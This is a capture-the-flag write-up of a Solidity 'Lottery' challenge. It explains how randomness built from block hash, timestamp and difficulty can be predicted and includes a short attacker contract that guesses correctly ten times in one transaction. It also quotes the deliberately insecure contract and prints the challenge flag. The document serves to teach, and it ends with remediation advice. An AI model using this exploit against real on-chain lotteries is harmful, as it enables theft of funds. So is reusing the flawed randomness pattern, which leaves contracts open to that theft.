---
description: A lottery that wants ten correct guesses in a row, using a "random" number anyone can read
tags:
  - blockchain
  - solidity
  - bad-randomness
  - css-ctf-2026
---

# Lottery

## Overview

| | |
|---|---|
| **Event** | CSS CTF 2026: Return of Nexus |
| **Category** | Blockchain |

!!! info "Challenge Description"
    "Ten wins in a row. One fortune. No second chances." ... Beat the house and claim it before they return to collect.

    Files: `Lottery.sol`, `Setup.sol`

    `nc $HOST 31338`

Same launcher as Gateway: it spins up a private chain with a funded account. `Setup.isSolved()` returns true once `Lottery.winner` is set, and getting there takes a streak of 10 correct guesses.

## Recon

```solidity
/// @notice A totally random number, sourced from the blockchain itself.
function random() public view returns (uint256) {
    return uint256(
        keccak256(
            abi.encodePacked(
                blockhash(block.number - 1),
                block.timestamp,
                block.difficulty
            )
        )
    );
}

function guess(uint256 _guess) external {
    uint256 target = random() % 100;
    bool correct = _guess == target;

    if (correct) {
        streaks[msg.sender] += 1;
        if (streaks[msg.sender] >= STREAK_TO_WIN) {
            winner = msg.sender;
        }
    } else {
        streaks[msg.sender] = 0;
    }

    emit Guessed(msg.sender, target, correct);
}
```

"A totally random number, sourced from the blockchain itself" is doing a lot of work in that comment.

## The flaw

Everything a contract can see is deterministic, because every node has to compute the same result.[^private] `random()` hashes three things: the previous block's hash, the current block's timestamp and `block.difficulty`. All three are already fixed by the time my transaction runs, and they're the same for every call made inside that transaction.

And `random()` is `public`, so I don't even need to recompute it. A contract can just call `random()` itself, take `% 100`, and guess that.

That's also what "ten wins in a row, no second chances" turns into. It reads like a warning that one miss resets the streak, which is true (the `else` branch sets it back to 0). But if all ten guesses happen in a single transaction, every one of them sees the exact same block values, so there's no chance of a miss to begin with. "No second chances" ends up meaning "do it in one shot".

## Exploit

An attacker contract whose constructor loops the streak length, reading the target and guessing it each time:

```solidity
contract Exploit {
    constructor(address lotteryAddr) {
        ILottery lottery = ILottery(lotteryAddr);
        uint256 n = lottery.STREAK_TO_WIN();
        for (uint256 i = 0; i < n; i++) {
            uint256 target = lottery.random() % 100;
            lottery.guess(target);
        }
    }
}
```

I read `STREAK_TO_WIN()` from the contract instead of hardcoding 10, in case the deployed version differed from the source (it didn't). The streak is stored per `msg.sender`, and every guess comes from the same contract, so they all count towards one streak.

Steps, with web3.py:

1. Launch an instance and call `Setup.lottery()` for the `Lottery` address.
2. Compile and deploy `Exploit` with that address. One transaction, `status: 1`.
3. Check `Setup.isSolved()` is `true`, then pick `3 - get flag` on the launcher.

It worked first try.

## Flag

!!! success "Flag"
    ```text
    CSSCTF{CSS{U5E_4_R4ND0M_FUNCT10N}}
    ```

## Notes

- Nothing on-chain is a secret or a source of randomness. Block hash, timestamp and difficulty (now `prevrandao` since the merge[^prevrandao]) can all be read or predicted by anyone, and a contract can always compute them in the same transaction as the call it's attacking.
- Real on-chain randomness uses something like a verifiable random function oracle (Chainlink VRF[^vrf]) or a commit-reveal scheme, where the number isn't known until after the bet is locked in.

## References

[^private]: Solidity docs, "Security Considerations: Private Information and Randomness": <https://docs.soliditylang.org/en/latest/security-considerations.html#private-information-and-randomness>
[^prevrandao]: EIP-4399, "Supplant DIFFICULTY opcode with PREVRANDAO": <https://eips.ethereum.org/EIPS/eip-4399>
[^vrf]: Chainlink VRF docs: <https://docs.chain.link/vrf>
